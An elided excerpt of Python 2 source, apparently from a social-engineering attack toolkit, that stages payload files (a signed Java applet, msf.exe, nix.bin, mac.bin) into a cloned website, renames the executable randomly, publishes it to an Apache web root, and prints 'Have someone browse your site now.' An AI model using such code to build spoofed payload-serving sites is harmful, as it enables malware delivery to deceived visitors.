...
if template == "CUSTOM" or template == "SELF":
	...
	if attack_vector != 'hid': 
		if attack_vector != 'hijacking':
			...
			subprocess.Popen("cp %s/src/html/Signed_Update.jar %s/src/webattack/web_clone/site/template/ 1> /dev/null 2> /dev/null;cp %s/src/html/nix.bin %s/src/webattack/web_clone/site/template 1> /dev/null 2> /dev/null;cp %s/src/html/mac.bin %s/src/webattack/web_clone/site/template 1> /dev/null 2> /dev/null;cp %s/src/html/msf.exe %s/src/webattack/web_clone/site/template 1> /dev/null 2> /dev/null" % (definepath,definepath,definepath,definepath,definepath,definepath,definepath,definepath), shell=True).wait() 
			...
			if os.path.isfile("%s/src/program_junk/rand_gen" % (definepath)):
				...
				if os.path.isfile("%s/src/program_junk/custom.exe" % (definepath)):
					subprocess.Popen("cp %s/src/html/msf.exe %s/src/webattack/web_clone/site/template" % (definepath,definepath), shell=True).wait()
					print "\n[*] Website has been cloned and custom payload imported. Have someone browse your site now"
				subprocess.Popen("mv %s/src/webattack/web_clone/site/template/msf.exe %s/src/webattack/web_clone/site/template/%s 1> /dev/null 2> /dev/null" % (definepath,definepath,rand_gen), shell=True).wait()
	os.chdir("%s/src/webattack/web_clone/site/template" % (definepath))
...
if os.path.isfile("%s/src/program_junk/docbase.file" % (definepath)):
	...
	subprocess.Popen("mv %s/src/webattack/web_clone/site/template/index.html %s/src/webattack/web_clone/site/template/site.html 1> /dev/null 2> /dev/null" % (definepath,definepath), shell=True).wait()
	filewrite=file("%s/src/webattack/web_clone/site/template/index.html" % (definepath), "w")
...
if apache == 1:
	subprocess.Popen("cp %s/src/html/*.bin %s 1> /dev/null 2> /dev/null;cp %s/src/html/*.html %s 1> /dev/null 2> /dev/null;cp %s/src/webattack/web_clone/site/template/* %s 1> /dev/null 2> /dev/null;cp %s/src/html/msf.exe %s 1> /dev/null 2> /dev/null;cp %s/src/html/Signed* %s 1> /dev/null 2> /dev/null" % (definepath,apache_path,definepath,apache_path,definepath,apache_path,definepath,apache_path,definepath,apache_path), shell=True).wait()
